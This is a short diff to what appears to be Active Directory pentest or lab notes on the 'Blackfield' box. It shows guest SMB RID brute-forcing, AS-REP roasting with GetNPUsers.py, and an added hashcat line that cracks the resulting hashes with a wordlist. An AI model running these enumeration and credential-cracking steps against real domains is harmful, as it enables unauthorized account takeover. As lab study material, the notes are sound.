@@ -15,6 +15,7 @@ keywords: Internals
 nxc smb 10.10.10.192 -u 'guest' -p '' --rid-brute > sid.txt
 cat sid.txt | awk -F': ' '{print $2}' | awk '{print $1}' | sed 's/BLACKFIELD\\//' > users.txt
 GetNPUsers.py BLACKFIELD/ -usersfile users.txt -format hashcat
+hashcat -m 18200 creds.txt /usr/share/wordlists/rockyou.txt
 ```
 
 # Active Directory Exploitation Strategies
